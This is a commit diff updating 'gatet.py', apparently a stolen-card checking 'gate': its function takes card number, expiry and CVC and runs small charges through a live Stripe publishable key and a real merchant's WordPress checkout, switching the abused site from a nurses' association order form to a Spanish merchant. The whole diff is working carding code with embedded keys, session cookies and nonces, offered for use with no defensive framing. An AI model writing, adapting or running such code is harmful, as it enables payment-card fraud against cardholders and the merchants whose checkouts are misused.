4bdf0acd536048910df13a3b68f3cfab1afc8e0a
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-03-11 13:38:55 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -10,6 +10,37 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 	
+	cookies = {
+	    'asp_transient_id': '9284bbc9c0782e40d96c489083ff0bdf',
+	    '_ga_YB7GN0XGNN': 'GS1.1.1741674170.1.0.1741674170.0.0.0',
+	    '_ga': 'GA1.1.563523735.1741674171',
+	    '__stripe_mid': 'bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac',
+	    '__stripe_sid': 'befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
+	}
+	
+	headers = {
+	    'authority': 'www.bba-girona.com',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    # 'cookie': 'asp_transient_id=9284bbc9c0782e40d96c489083ff0bdf; _ga_YB7GN0XGNN=GS1.1.1741674170.1.0.1741674170.0.0.0; _ga=GA1.1.563523735.1741674171; __stripe_mid=bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac; __stripe_sid=befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
+	    'origin': 'https://www.bba-girona.com',
+	    'referer': 'https://www.bba-girona.com/asp-payment-box/?product_id=593',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = 'action=asp_pp_create_pi&nonce=ed6318a4f6&amount=100&curr=EUR&product_id=593&quantity=1&billing_details={"name":"Rodam%20User%20","email":"rodamuser20%40gmail.com"}&token=d2f8760003e56bbc476efc989a4b6fda&customer_details={"name":"Rodam%20User%20","firstName":"Rodam%20User","lastName":"","email":"rodamuser20%40gmail.com"}'
+	
+	r1 = requests.post('https://www.bba-girona.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	
+	pi = r1.json()['pi_id']
+	
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -26,25 +57,28 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+card-element&key=pk_live_51PQJl0Rr4XSwUqgRgkZ4nUXxhwt0HHBAWd4OJ1VU1FrT8jDmEXWbgW47CQnNo8r928hVrXpYmJ7E3c0TDvXGoboa004mWcAVAz'
+	data = f'card[name]=Rodam+User+&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56a6ae254e%3B+stripe-js-v3%2F56a6ae254e%3B+card-element&key=pk_live_51Mk2GiCM87UYzkWxgwx5Ve8YEMwZOmdgADBlvgwWT0MQ7ThYiPYJFzjoKrCBRGUZwwqkbTOHNB0Qid4VFvVRYncf00MvIVFrE4&_stripe_version=2024-12-18.acacia'
 	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	r2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
-	pm = r1.json()['id']
+	tok = r2.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': 'e8f0f4d9-fc0d-4355-a453-00edebe0a6726b1e7b',
-	    '__stripe_sid': '4bff58ec-deb4-4bad-965b-2df54bc8c6b4cfe59c',
+	    'asp_transient_id': '9284bbc9c0782e40d96c489083ff0bdf',
+	    '_ga_YB7GN0XGNN': 'GS1.1.1741674170.1.0.1741674170.0.0.0',
+	    '_ga': 'GA1.1.563523735.1741674171',
+	    '__stripe_mid': 'bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac',
+	    '__stripe_sid': 'befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
 	}
 	
 	headers = {
-	    'authority': 'illinoisnurses.com',
+	    'authority': 'www.bba-girona.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=e8f0f4d9-fc0d-4355-a453-00edebe0a6726b1e7b; __stripe_sid=4bff58ec-deb4-4bad-965b-2df54bc8c6b4cfe59c',
-	    'origin': 'https://illinoisnurses.com',
-	    'referer': 'https://illinoisnurses.com/order-ina-swag/',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    # 'cookie': 'asp_transient_id=9284bbc9c0782e40d96c489083ff0bdf; _ga_YB7GN0XGNN=GS1.1.1741674170.1.0.1741674170.0.0.0; _ga=GA1.1.563523735.1741674171; __stripe_mid=bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac; __stripe_sid=befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
+	    'origin': 'https://www.bba-girona.com',
+	    'referer': 'https://www.bba-girona.com/asp-payment-box/?product_id=593',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -52,21 +86,10 @@ def Tele(ccx):
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1741172361047',
-	}
+	data = 'action=asp_pp_confirm_pi&nonce=abbbb23288&product_id=593&pi_id='+str(pi)+'&token=d2f8760003e56bbc476efc989a4b6fda&opts={"save_payment_method":true,"setup_future_usage":"off_session","receipt_email":"rodamuser20%40gmail.com","payment_method_data":{"type":"card","card":{"token":"'+str(tok)+'"}}}'
 	
-	data = 'data=__fluent_form_embded_post_id%3D14261%26_fluentform_9_fluentformnonce%3Dbad403ac56%26_wp_http_referer%3D%252Forder-ina-swag%252F%26payment_input%3D20%26item-quantity%3D%26payment_input_1%3D60%26item-quantity_1%3D%26payment_input_3%3D25%26item-quantity_3%3D%26payment_input_2%3D70%26item-quantity_2%3D%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26phone%3D0817480671%26email%3Drodamuser20%2540gmail.com%26dropdown_5%3DCity%2520of%2520Chicago%26input_radio_3%3DI%2520would%2520like%2520these%2520items%2520to%2520be%2520shipped%2520to%2520me%2520(%25245%2520per%2520item).%26custom-payment-amount%3D0.50%26input_radio_2%3DShip%2520to%2520the%2520above%2520address%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=9'
+	r3 = requests.post('https://www.bba-girona.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
-	r2 = requests.post(
-	    'https://illinoisnurses.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
-	
-	return (r2.json())
+	return (r3.json())
